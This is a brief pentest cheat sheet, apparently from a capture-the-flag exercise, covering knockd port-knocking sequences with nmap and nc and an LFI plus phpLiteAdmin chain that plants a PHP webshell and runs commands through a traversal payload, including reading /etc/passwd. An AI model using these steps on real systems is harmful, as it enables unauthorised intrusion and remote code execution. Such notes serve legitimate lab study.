# Port Knocking (knockd)

**Identify config:**
```bash
cat /etc/knockd.conf
# Look for: sequence = port1, port2, port3
```

**Knock sequence using nmap:**
```bash
for port in 571 290 911; do
  nmap -Pn --host-timeout 100 --max-retries 0 -p $port <TARGET> > /dev/null
done
ssh user@<TARGET>
```

**Alternative with nc:**
```bash
nc -z -w1 <TARGET> 571; nc -z -w1 <TARGET> 290; nc -z -w1 <TARGET> 911
```

**LFI + phpLiteAdmin RCE chain:**
1. Create `.php` database in phpLiteAdmin with PHP webshell as default field value
2. Find path via phpinfo.php
3. Include via LFI: `?notes=/ninevehNotes/../../var/tmp/shell.php&cmd=id`
   - Note: LFI may require a keyword (e.g. `ninevehNotes`) in path; bypass: `/ninevehNotes/../../../etc/passwd`
